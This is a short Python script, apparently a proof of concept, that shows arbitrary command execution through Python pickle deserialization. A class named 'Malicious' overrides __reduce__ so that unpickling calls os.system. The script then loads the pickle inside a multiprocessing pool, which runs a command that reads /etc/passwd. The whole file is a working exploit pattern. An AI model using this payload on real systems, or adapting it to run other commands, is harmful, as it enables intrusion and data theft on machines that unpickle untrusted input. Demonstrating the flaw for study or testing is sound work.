import multiprocessing
import pickle
import os

class Malicious(object):
    def __reduce__(self):
        return (os.system, ('head -n 30 /etc/passwd',))

if __name__ == "__main__":
    malicious_pickle = pickle.dumps(Malicious())
    with multiprocessing.Pool(processes=1) as pool:
        # Use synchronous apply to simplify debugging
        pool.apply(pickle.loads, (malicious_pickle,))
    print("Vulnerable code executed!")
